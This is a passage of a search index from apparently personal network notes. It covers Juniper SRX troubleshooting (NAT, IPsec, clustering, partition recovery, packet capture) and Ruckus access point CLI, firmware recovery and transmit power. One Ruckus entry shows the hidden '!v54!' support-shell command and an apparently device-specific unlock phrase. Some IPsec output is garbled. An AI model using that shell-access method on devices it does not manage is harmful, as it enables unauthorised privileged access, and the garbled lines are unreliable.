name&gt;\n\n#can be used to test connectivity from the router to a specific IP address, which can be        sed to verify reachability to the public or private IP addresses being accessed through     he NAT rule\nping\n\n#can be used to trace the path of a packet from the router to a specific IP address,    hich    can be used to identify any issues with the routing path\ntraceroute\n\n#look for nat\nshow log messages | match nat\n\n#look for rule set name\nshow log messages | match web-server\n\n#can be used to enable debugging for NAT, which can provide detailed information about  he    NAT process and any issues that may be occurring\ndebug security nat\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_NAT_Troubleshooting/#general-commands","title":"General commands","text":"<pre><code>#Debug with word nat\ndebug security nat\n\n#Debug using rule set name\ndebug security nat rule-set\n\n#Debug off\nno debug security nat\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Troubleshoot_restart_IPSEC_VPN/","title":"Juniper SRX Troubleshoot restart IPSEC VPN","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Troubleshoot_restart_IPSEC_VPN/#extra-sources","title":"extra sources","text":"<ul> <li>How to troubleshoot Problem Scenarios in VPN tunnels</li> <li>Juniper SRX &amp; J Series Site-to-Site VPN Configuration Generator</li> <li>YT - How to Troubleshoot IPSEC VPN (Phase 1) on a Juniper Networks SRX Firewall</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Troubleshoot_restart_IPSEC_VPN/#check-inactive-tunnels-first","title":"Check inactive tunnels first","text":"<pre><code>show security ipsec inactive-tunnels\nshow security ike security-associations\nshow security ipsec security-associations\nshow security ipsec statistics\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Troubleshoot_restart_IPSEC_VPN/#to-restart-srx-vpn","title":"To restart SRX VPN","text":"<pre><code>clear security ike security-associations\nclear security ipsec security-associations\nrestart ipsec-key-management\n\n#check IKE Phase 1 &amp; 2\nshow security ike\nrun show security ike security-associations\n\n#set capture file name\nset security ike traceoptions file debug-ike.log\n\n#set the flag that you want to capture\nset security ike traceoption flag ike\n\n#save changes\ncommit\n\n#check error reason &gt; this doesn't get extensive detail though\nrun monitor start debug-ike.log\n\n#Capture to check the reason &gt; Check the proposal values, look for type &amp; value\nmonitor traffic interface ge-0/0/0 matching \"port 500\" extensive\n</code></pre> <p>encryption types</p> <pre><code>ene value=3des  -&gt; Encryption 3DES\nene value=ldes  -&gt; Encryption DES\nene value=0007 keylen value=0080 -&gt; Encryption aes-128-cbc \nene value=0007 keylen value=00c0 -&gt; Encryption aes-192-cbc\nene value=0007 keylen value=0100 -&gt; Encryption aes-256-cbc\ngroup dese value=modp768  -&gt; DH Group 1\ngroup dese value=modpl024 -&gt; DH Group 2 \ngroup desc value=0005 -&gt; DH Group 5 \ngroup desc value=000e -&gt; DH Group 14\ngroup desc value=0018 -&gt; DH Group 24\nhash value=md5 -&gt; Authentication type md5\nhash value=shal -&gt; Authentication type shal\nhash value=0004 -&gt; Authentication type sha-256\nhash value=0005 -&gt; Authentication type sha-384\n(type-1ifeduration 1en-4 va1ue-0000c350)\nConvert HEX(c3500) TO Decimal (50000)\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Troubleshoot_restart_IPSEC_VPN/#enable-tracing","title":"Enable tracing","text":"<pre><code>root# set security ike traceoptions ?\nPossible completions:\n+ apply-groups         Groups from which to inherit configuration data\n+ apply-groups-except  Don't inherit configuration data from these groups\n&gt; file                 Trace file information\n&gt; flag                 Tracing parameters for IKE\nno-remote-trace      Disable remote tracing\n\n{primary:node0}[edit]\nroott# set security ike traceoptions flag all  \n\nroott# set security ipsec traceoptions flag ?\nPossible completions:\nall                  Trace with all flags enabled\nnext-hop-tunnel-binding  Trace next-hop tunnel binding events\npacket-drops         Trace packet drops\npacket-processing    Trace data packet processing events\nsecurity-associations  Trace security association management events\n{primary:node0}[edit]\nroott# set security ipsec traceoptions flag all\n\n#To show the log\nshow log &lt;filename&gt;\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Troubleshooting_Redundancy_Cluster_Failover/","title":"Juniper SRX Troubleshooting Redundancy Cluster Failover","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Troubleshooting_Redundancy_Cluster_Failover/#general-troubleshooting-commands","title":"General troubleshooting commands","text":"<pre><code>show system uptime\n\nshow chassis cluster information | no-more\n\nshow chassis cluster information detail | no-more\n\nshow configuration chassis cluster | no-more\n\nshow chassis cluster status | no-more\n\nshow chassis cluster status redundancy-group 0 | no-more\n\nshow log chassisd | no-more\n\nshow log jsrpd | match \"Dec 3\" | no-more\n\nshow services ip-monitoring status | no-more\n\nshow configuration services ip-monitoring | no-more\n\nKMD_VPN_DOWN_ALARM_USER\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_BOOTED_BACKUP/","title":"Juniper SRX WARNING BOOTED BACKUP","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_BOOTED_BACKUP/#1-problem","title":"1. Problem","text":"<p>SRX Firewalls running Junos Release 10.4R3, or later, have added resiliency based on the \"resilient dual-root partition\", which if the switch detects a corruption on the primary root le system, it boots from the alternate root partition.</p> <p>When this occurs, you are noticed in two ways: Alarm and Warning Banner</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_BOOTED_BACKUP/#11-alarm","title":"1.1.  Alarm","text":"<p>The following alarm message is generated</p> <pre><code>show  chassis  alarms\n</code></pre> <p>output</p> <pre><code>1  alarms  currently  active Alarm  time  Class  Description\n\n2011-02-17  05:48:49  PST  Minor  Host  0  Boot  from  backup  root\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_BOOTED_BACKUP/#12-warning","title":"1.2. Warning","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_BOOTED_BACKUP/#2-cause-solution","title":"2. Cause &amp; Solution","text":"<p>It likely became corrupted due to a sudden power loss, or ungraceful shutdown of the system.</p> <p>Repairing the primary partition when it is corrupted:</p> <ul> <li>When the primary partition detects a corrupt, the device boots from the backup partition; which then becomes the active partition. Remember that after every successive reboot, the system will try to reboot from the current active partition.</li> <li>You can repair the primary partition, without any downtime. No reboot is required after running the following commands. However the Alarm and Banner will be displayed.</li> </ul> <p>Note: As long as both of the partitions are healthy, there is no issue with running the switch on either of them. You only have to ensure that both the partitions are healthy, so that fail over can be done transparently between the two partitions, in case of any le corruption.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_BOOTED_BACKUP/#21-verification","title":"2.1. Verification","text":"<p>To verify if the primary partition is rebuilt, the same commands also inform about which partition is the current active partition.</p> <pre><code>show system storage partitions\n</code></pre> <p>output</p> <pre><code>root&gt; show system storage partitions\nfpc0:\n--------------------------------------------------------------------------\nBoot Media: internal (da0)\nActive Partition: da0s1a\nBackup Partition: da0s2a                  &lt;-- this is the backup slice\nCurrently booted from: backup (da0s2a)    &lt;-- shows booted from that slice\nPartitions information:\nPartition Size Mountpoint\ns1a 184M altroot\ns2a 184M /\ns3d 369M /var/tmp\ns3e 123M /var\ns4d 62M /config\ns4e unused (backup config) \n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_BOOTED_BACKUP/#3recovery-procedure","title":"3.Recovery Procedure","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_BOOTED_BACKUP/#31-copy-junos-image-from-backup","title":"3.1. Copy JUNOS Image From Backup","text":"<p>Copy the Junos image from the backup partition to the primary partition, by using the following snapshot command For SRX</p> <pre><code>request system snapshot slice alternate\n</code></pre> <p>You will see the following message as the media is copied over</p> <pre><code>Formatting alternate root (/dev/da0s2a)...\nCopying '/dev/da0s1a' to '/dev/da0s2a' .. (this may take a few minutes)\nThe following filesystems were archived: /\nNote: This step ensures that you have consistent images on both the primary and backup partitions. This operation can take 5 to 10 minutes to complete.\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_BOOTED_BACKUP/#32-verify-partitions","title":"3.2. Verify Partitions","text":"<p>The above command ensures that the alternate partition is repaired, without requiring a reboot. You can verify both the partitions by using the following command</p> <pre><code>show system snapshot media internal\n</code></pre> <p>This will show the time/date stamp for both partitions, which should show the current date/time on the (primary) partition which has been restored. See sample</p> <p>output</p> <pre><code>root@srx&gt; show system snapshot media internal\nInformation for snapshot on internal (/dev/da0s1a) (primary)\nCreation date: Jan 22 23:48:47 2016                          &lt;-- Displays current date/time of operation in step 3.1\nJUNOS version on snapshot:\njunos : 12.1X44-D15.5-domestic\nInformation for snapshot on internal (/dev/da0s2a) (backup)\nCreation date: Jan 1 06:08:27 2000\nJUNOS version on snapshot:\njunos : 12.1X44-D15.5-domestic\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_BOOTED_BACKUP/#4reboot","title":"4.Reboot","text":"<p>In order to get rid of the alarm and ensure the partition has been repaired successfully, the system must be rebooted. There are 2 options to reboot given the environment the system is deployed in.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_BOOTED_BACKUP/#41-reboot-now","title":"4.1. Reboot Now","text":"<p>If there is no risk to the network or customer, the system can be rebooted immediately. To get rid of the above alarm, use the following command to ensure that the switch boots from the primary partition:</p> <p>request system reboot The system, after the above command is executed, will reboot from the primary partition. The alarm or the warning message will no longer be displayed</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_BOOTED_BACKUP/#42-reboot-later","title":"4.2. Reboot Later","text":"<p>Reboot after X amount of minutes. Change the value after \"in\" to be the amount of minutes to reach the maintenance window scheduled. In this scenario, the system would reboot in 8 hours from the time the command is issued (60 minutes x 8 hours = 480)</p> <pre><code>request system reboot in 480\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_BOOTED_BACKUP/#5-verify","title":"5. Verify","text":"<p>Once the system has rebooted, run the following commands to ensure the system has booted back to the primary partition</p> <pre><code>show chassis alarms\n</code></pre> <p>You should no longer see the alarm</p> <pre><code>1 alarms currently active\nAlarm time Class Description\n2011-02-17 05:48:49 PST Minor Host 0 Boot from backup root \n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_REMOTE_HOST_IDENTIFICATION_HAS_CHANGED/","title":"Juniper SRX WARNING REMOTE HOST IDENTIFICATION HAS CHANGED","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_REMOTE_HOST_IDENTIFICATION_HAS_CHANGED/#error","title":"error","text":"<pre><code>Juni-srx&gt; ssh admin@192.168.161.6\n\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nIT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!\nSomeone could be eavesdropping on you right now (man-in-the-middle attack)!\nIt is also possible that a host key has just been changed.\nThe fingerprint for the RSA key sent by the remote host is\nSHA256:vb3mSzI34f34fId6SkSz/PZwuR072P7sadf43f43f34RhKniE.\nPlease contact your system administrator.\nAdd correct host key in /var/home/remote/.ssh/known_hosts to get rid of this message.\nOffending RSA key in /var/home/remote/.ssh/known_hosts:4\nRSA host key for 192.168.161.6 has changed and you have requested strict checking.\nHost key verification failed.\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_WARNING_REMOTE_HOST_IDENTIFICATION_HAS_CHANGED/#solution","title":"solution","text":"<pre><code>CLI&gt;start shell\n\nCLI&gt; cat /var/home/remote/.ssh/known_hosts | grep 192.168.161.6\n\n192.168.161.6 ssh-rsa AAAAB3NzaC1yc2EAAAADAQAyo8s7dfyhsdf96cXN26tB3VMcZ5klCpZVGoP6KJM17DmG47CL6ZP+uusUh0ne2RsUIaZO8WkNXjkqUkVRpKMOVUHJBlmGKE3S+IKXNpSpHNZ1bARTBnsdfsdfirMEcZZ224UcOlheoGidsUMxRL3wzCxFtVBIkufXV1RgC612dl3WTbJC/NxWac3CbrbLZM3FS8eNptiedWpVixNed60XAiYLKL3JYE8FWtgCjkqeiVSSFx8TCh354ga34pxMy25l9P\n\nCLI&gt; ssh-keygen -f /var/home/remote/.ssh/known_hosts -R \"192.168.161.6\" \n\n# Host 192.168.161.6 found: line 4\n/var/home/remote/.ssh/known_hosts updated.\nOriginal contents retained as /var/home/remote/.ssh/known_hosts.old\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_packet_capture_pcap/","title":"Juniper SRX packet capture pcap","text":"<p>Sources: How to create a PCAP packet capture on a SRX branch device</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_packet_capture_pcap/#step-1-configure-forwarding-options","title":"Step 1: Configure forwarding options","text":"<p>To do this, navigate to forwarding-options and then to packet-capture hierarchy as below:</p> <pre><code>[edit]\nedit forwarding-options packet-capture\n\n#Specify a file name for the packet capture and set the maximum-capture-size to 1500 as below\nset file filename packetcapture\nset maximum-capture-size 1500\n\nshow\n    file filename testpacketcapture;\n    maximum-capture-size 1500;\n\ntop\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_packet_capture_pcap/#step-2-configure-firewall-filter-for-packet-capture","title":"Step 2: Configure firewall filter for packet capture","text":"<p>This is strongly recommended because with the firewall filter, the amount of traffic to be capture can be restricted, and it is less CPU intensive, as compared without filters.</p> <p>To do this, set the filter, term name, define the match condition, and its action.</p> <p>For example the firewall filter below will collect traffic that arrives on the interface with a source address of 10.209.242.138 AND destination-address of 10.204.115.166 AND vice versa. The term allow-all-else is used to make sure that the SRX does not drop any other traffic, but do not sample it either.</p> <pre><code>set firewall filter PCAP term 1 from source-address &lt;public_ip&gt;\nset firewall filter PCAP term 1 then sample\nset firewall filter PCAP term 1 then accept\nset firewall filter PCAP term 2 from destination-address &lt;public_ip&gt;\nset firewall filter PCAP term 2 then sample\nset firewall filter PCAP term 2 then accept\nset firewall filter PCAP term allow-all-else then accept\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_packet_capture_pcap/#step-3-apply-firewall-filter-to-desired-interface","title":"Step 3: Apply firewall filter to desired interface","text":"<p>Decide which interface you want to capture the packets on. This must be an Ethernet interface.</p> <p>For this example, interface ge-0/0/0 is used. Apply the firewall filter on the desired interface for the input and output direction:</p> <p>FOR VLAN TAGGING</p> <pre><code>set interfaces ge-0/0/0 unit 0 family inet filter output PCAP\nset interfaces ge-0/0/0 unit 0 family inet filter input PCAP\n</code></pre> <p>FOR ethernet-switching</p> <pre><code>set interfaces ge-0/0/0 unit 0 family ethernet-switching filter output PCAP\nset interfaces ge-0/0/0 unit 0 family ethernet-switching filter input PCAP\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_packet_capture_pcap/#step-4-commit-to-activate-the-packet-capture","title":"Step 4: Commit to activate the packet capture","text":"<pre><code>user@host# commit\n</code></pre> <p>Once you commit, then run your test to pass the traffic that needs to be captured. Once the test is complete, deactivate the packet capture to stop the collection of packets. To do this, remove the packet-capture and sampling configuration that was just added above and commit. A quick way to do this is using rollback:</p> <pre><code>user@host# rollback 1\nuser@host# commit\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_packet_capture_pcap/#step-5-copy-packet-capture-file-from-the-srx-device-and-view-it-with-your-pcap-utility","title":"Step 5: Copy packet capture file from the SRX device, and view it with your PCAP utility","text":"<p>The captured file is located in the /var/tmp directory and is formatted in the PCAP format. You can find the file with the file list command.</p> <p><pre><code>user@host&gt; file list /var/tmp/ | match testpacketcapture*  \ntestpacketcapture1.ge-0.0\n</code></pre> Copy this file to your PC.</p> <p>The packet capture file created can be viewed with Wireshark, Ether</p> <p>SAMPLE FOR CAPTURE</p> <pre><code>edit forwarding-options packet-capture\nset file filename AWSVPN-Capture\nset maximum-capture-size 1500\nshow\ntop\n\nset firewall filter PCAP term 1 from destination-address &lt;public_ip&gt;\nset firewall filter PCAP term 1 then sample\nset firewall filter PCAP term 1 then accept\nset firewall filter PCAP term allow-all-else then accept\n\nset interfaces ge-0/0/0 unit 0 family inet filter output PCAP\nset interfaces ge-0/0/0 unit 0 family inet filter input PCAP\n\ncommit\n\nrollback 1\ncommit\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Meraki/Meraki_SFP/","title":"Meraki SFP","text":"<p>Info</p> <p>Small-Form Factor Pluggable (SFP) and Stacking Accessories - Cisco Meraki Documentation</p> <p>Click to open PDF in new tab</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/","title":"AP CLI Setup Support Config Flow Ruckus SZ","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#wap-wlc-communication-method","title":"WAP WLC Communication method","text":"<p>AP utilizes SSH to communicate with the controller</p> <ul> <li>APs running Solo <code>110.X</code> and above</li> <li>APs running SZ <code>5.x</code> and above</li> <li>APs running Unleashed <code>200.x</code> and newer</li> </ul> <p>AP utilizes <code>LWAPP</code> to communicate with the controller</p> <ul> <li>APs running ZD <code>9.x</code></li> <li>APs running solo <code>104.x</code> or prior</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#lwapp","title":"LWAPP","text":"<p>In SmartZone under Cluster Information &gt; Only first time config you can enable the AP Conversion (This enables <code>LWAPP</code>) &gt; if not enabled then, you can re-enable it from GUI, you have to go to CLI. You can enable this option or disable it through CLI when onboarding APs depending on compatibility</p> <pre><code>enable\nShow run lwapp2scg\n#check the policy if deny all or allow all\n\nconfig\nlwapp2scg\n\n#from the below choose either accept-all to enable, or deny-all to disable\npolicy accept-all\npolicy deny-all\n\nend\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#ssh","title":"SSH","text":"<pre><code>get ssh\nget sshtunnel\nget tunnelmgr\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#ap-cli-based-on-platform-support","title":"AP CLI based on platform support","text":"<pre><code>#works for uneashed\nenable\nap-modeccess to all commands\n\n#works for uneashed  3.6+ 9.13+  110.x+   |   display SZ info\nget scg\nset scg enable\n\n#works for uneashed  3.6+ 9.13+  110.x+\nset scg ip [xxxxx]\n\n#works for uneashed  3.6+ 9.13+  110.x+   |   To delete the SZ IP\nset scg ip del\n\n#works for 3.6+ 9.13+  110.x+\nset factory\n\n#works for uneashed\nset-factory\n\n#Work for all\nreboot\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#configuring-ap-models-to-join-sz","title":"Configuring AP models to join SZ","text":"<p>for APs on <code>110.0x</code></p> <pre><code>in GUI you can enable Discovery options such as LWAPP or configure the SZ address\n</code></pre> <p>for APs on Unleashed</p> <pre><code>enable\nap-mode\nset scg ip x.x.x.x\nget scg\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#creating-registration-rule","title":"creating registration Rule","text":"<p>System &gt; AP Settings &gt; AP Registration &gt; Create</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#smartzone-ap-discovery-process","title":"Smartzone AP DISCOVERY process","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#discovery-ap-to-sz","title":"Discovery AP to SZ","text":"<p>AP sends its status and capabilities including</p> <ul> <li>HW &amp; Firmware</li> <li>Radio types</li> <li>Encryption services support</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#discovery-sz-to-ap","title":"Discovery SZ to AP","text":"<p>SZ status and capabilities including</p> <ul> <li>Cluster Node address (Control &amp; Data Plane)</li> <li>SSH certificate</li> <li>SZ firmware install (with dependencies)</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#next-steps","title":"next steps","text":"<p>AP sends discover AP installs SSH cert AP waits in default Group</p> <p>DIR or CTL LED Indicator is used for AP controller communication</p> <pre><code>Slow green flashing: no controller connection\nFast green flash : firmware/config updating\nSolid green: AP connected to controller\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#access-point-registration-process","title":"Access Point Registration - Process","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#sz-high-scale","title":"SZ High scale","text":"<ul> <li>AP sends discovery request</li> <li>Install SSH Cert</li> <li>AP waits in default AP Group in staging Zone (No firmware download at this point)</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#sz-essentials","title":"SZ Essentials","text":"<ul> <li>AP sends discovery request</li> <li> <p>Install SSH Cert</p> </li> <li> <p>Scenario 1:</p> <ul> <li>If Auto approval is disabled &gt; AP will wait for approval</li> <li>Once approval granted &gt; AP goes into the default Zone within the Default Group and downloads the firmware</li> </ul> </li> <li> <p>Scenario 2</p> <ul> <li>If Auto approve enabled &gt; AP joins Default Zone Default Group and downloads firmware</li> </ul> </li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#access-point-registration-completion","title":"Access Point Registration - Completion","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#sz-high-scale_1","title":"SZ High scale","text":"<ul> <li>AP moved to zone / Sub-Domain</li> <li>Once AP approved it download the SZ FW and Zone Config from SZ</li> <li>AP establishes Control tunnel (If configured, it will also establish - the Data tunnel connection)</li> <li>AP reports health</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#sz-essentials_1","title":"SZ Essentials","text":"<ul> <li>AP moved to Zone</li> <li>Once AP approved it downloads the Zone Config from SZ</li> <li>AP establishes Control tunnel (If configured, it will also establish - the Data tunnel connection)</li> <li>AP reports health</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#sz-ap-dhcp-discovery","title":"SZ AP DHCP Discovery","text":"<ul> <li>Discovery through DHCP &gt; SZ address will be sent to all clients if option - 60 is used</li> <li>Option 43 : <code>Code 6</code></li> <li>Option 60 : <code>Ruckus CPE</code></li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#smartzone-used-ports","title":"SmartZone used Ports","text":"<p>UDP</p> Port Description 123 NTP <p>TCP</p> Port Description 21 FTP for AP upgrade 22 SSH for AP CLI connectivity 91 FTP for SmartZone to update 3.x, 100.x, or 110.x AP 443 New AP Registration 8443 SmartZone Web GUI"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_CLI_Setup_Support_Config_Flow_Ruckus_SZ/#event-alarms","title":"Event &amp; Alarms","text":"<p>Event &amp; Alarms &gt; Events You can see <code>sent a discovery request to SmartZone</code></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_Firmware_Recovery_CLI_Ruckus_SZ/","title":"AP Firmware Recovery CLI Ruckus SZ","text":"<p>To recover an Access Point whereby the management interface can no longer be accessed when in either \"Unleashed Mode\", Standalone or the AP is simple not functioning as expected and the ability to flash firmware via the controller is not working.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_Firmware_Recovery_CLI_Ruckus_SZ/#pre-requisites","title":"Pre-Requisites","text":"<p>Download the latest version of standalone firmware relevant to your access point Please ensure you have installed a TFTP server running on your laptop or desktop which has access to the switch, for windows TFTPD32 is recommended and can be found &gt; TFTPD32 Download  http://tftpd32.jounin.net/tftpd32_download.html</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_Firmware_Recovery_CLI_Ruckus_SZ/#configuring-the-control-files","title":"Configuring The Control Files","text":"<p>Before you can tell the AP's to manually downgrade there firmware you must first create a file called fwcntrl.rcks and use your favourite text editor to modify the contents.</p> <p>The contents must contain the following</p> <pre><code>[rcks_fw.main]\nIP address of TFTP Host\nStandalone Firmware File Name\nSize of Standalone Firmware file in Bytes\nAn example can be seen below, this file must be stored in your root TFTP directory along with the standalone firmware file.\n\n[rcks_fw.main]\n192.168.12.222\nH320_110.0.0.0.663.bl7\n12720124\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_Firmware_Recovery_CLI_Ruckus_SZ/#cli-commands-for-aps-not-running-unleashed-207x-later","title":"CLI Commands for AP's NOT running Unleashed 207.x &amp; Later","text":"<p>These commands must be ran on the AP directly via SSH once logged in</p> <pre><code>fw set control fwcntrl.rcks\nfw set proto tftp\nfw set host 192.168.12.222 &gt;&gt;&gt;&gt; IP address of TFTP Server\nfw update\n</code></pre> <p>Do not interupt the update once the command \"fw update\" has been entered. Should the update timeout re run the above commands.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_Firmware_Recovery_CLI_Ruckus_SZ/#cli-commands-for-aps-running-unleashed-207x-later","title":"CLI Commands for AP's running Unleashed 207.x &amp; Later","text":"<p>These commands must be ran on the AP directly via SSH one logged in</p> <pre><code>enable\nap-mode\nfw set control fwcntrl.rcks\nfw set proto tftp\nfw set host 192.168.12.222 &gt;&gt;&gt;&gt; IP address of TFTP Server\nfw update\n</code></pre> <p>Do not interupt the update once the command \"fw update\" has been entered. Should the update timeout re run the above commands.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_TX_Power_EIRP_Ruckus_SZ/","title":"AP TX Power EIRP Ruckus SZ","text":"<p>EIRP (dBm) = Conducted Power (dBm) + Antenna Gain (dBi) \u2013 Cable loss (dB)</p> <p>Max EIRP allowed by FCC on Access Points</p> <ul> <li>2.4 GHz Channels 1 \u2013 11 (36 dBm)</li> <li>5 GHz U-NII-1 channels 36 \u2013 48 (36 dBm)</li> <li>5 GHz U-NII-2A channels 52 \u2013 64 (30 dBm)</li> <li>5 GHz U-NII-2C channels 100 \u2013 144 (30 dBm)</li> <li>5 GHz U-NII-3 channels 149 \u2013 165 (36 dBm)</li> </ul> <p>Antenna Gain</p> <p>This is where Ruckus shines with the Beamflex gain. Beamflex adaptive antenna will get you approx. 3 dBi gain per 2 radio chains on most models. This will be added to the conductive power you set on the management interface and will make sure the EIRP is less than the FCC limit.</p> <p>\"support shell command\"</p> <p>below command is what support uses to get into shell, they then would have to enter an encrypted phrase generated based on device S/N</p> <pre><code>!v54!\nxv11e2UPjEmTCx806HutA85XE1su4pKzJgPuCEod0P4UQGwq8Ogx8QtWwxUViu7\n</code></pre> <p>Looks for 2.4GHZ TX POWER TARGET &gt; MCS0 HT20 &gt; Pout dBm Value that's the Max 5GHZ TX POWER TARGET &gt; MCS0 VHT20 &gt; Pout dBm Value that's the Max</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_TX_Power_EIRP_Ruckus_SZ/#how-to-find-the-conducted-power-of-your-ruckus-unleashed-ap","title":"How to find the conducted power of your Ruckus Unleashed AP?","text":"<p>Run the below commands on WAP</p> <pre><code>ruckus&gt; en\nruckus# debug\nruckus(debug)# rksap_cli -A -s \"iwconfig\"\n</code></pre> <p>Below is a H510 AP configured with maximum Tx power. It shows 2.4 GHz using Tx power as 16 dBm and 5 GHz at 19 dBm.</p> <p></p> <p>R710 shows 2.4 GHz at 22 dBm and 5 GHz at 20 dBm.</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_TX_Power_EIRP_Ruckus_SZ/#how-to-find-the-conducted-power-of-your-ruckus-smartzone-ap","title":"How to find the conducted power of your Ruckus SmartZone AP?","text":"<p>If you want to find the same Tx information in SZ-managed APs, you will need to access the shell mode of the AP and execute the below command:</p> <pre><code>iwconfig wifi0\nwifi0     wifi0  Frequency:2.462 GHz  Tx-Power:23 dBm\n</code></pre> <p>The above command shows the Tx power of the 2.4 GHz radio of an Access point.</p> <p>remember to include the beamflex gain when you do a predictive design or when you configure the Tx power settings. </p> <pre><code>iwconfig wifi0\nRequire shell access to the AP, TAC 